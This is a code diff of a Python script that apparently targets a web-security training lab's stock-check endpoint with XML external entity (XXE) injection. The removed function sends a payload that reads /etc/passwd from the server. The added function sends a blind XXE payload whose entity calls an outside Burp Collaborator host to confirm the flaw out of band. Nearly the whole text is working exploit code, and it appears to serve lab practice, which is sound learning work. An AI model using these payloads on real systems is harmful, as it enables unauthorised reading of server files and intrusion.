@@ -19,17 +19,20 @@ def get_website_url():
 		url = argv[1]
 	return url
 
-def get_etc_passwd(url):
-	stock_path = "/product/stock"
-	xxe_payload = '<?xml version="1.0" encoding="UTF-8"?>\
-				  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\
-				  <stockCheck>\
-				  <productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
+
+def blind_xxe_with_burp_colaboritor(url):
+	stock_path = '/product/stock'
+						# change this 
+	burp_colaboritor_url = 'http://413sptw6nb67mnwb5rytse12nttjh8.oastify.com'
+	xxe_payload = f'<?xml version="1.0" encoding="UTF-8"?>\
+				   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{burp_colaboritor_url}"> ]>\
+				   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
 
 	r = requests.post(url + stock_path, data=xxe_payload, verify=False, proxies=proxies)
 	print(r.text)
-
+	print('[!] check burp colaboritor')
 
 
 print("[+] Starting attack")
-get_etc_passwd(get_website_url())
+blind_xxe_with_burp_colaboritor(get_website_url())
+
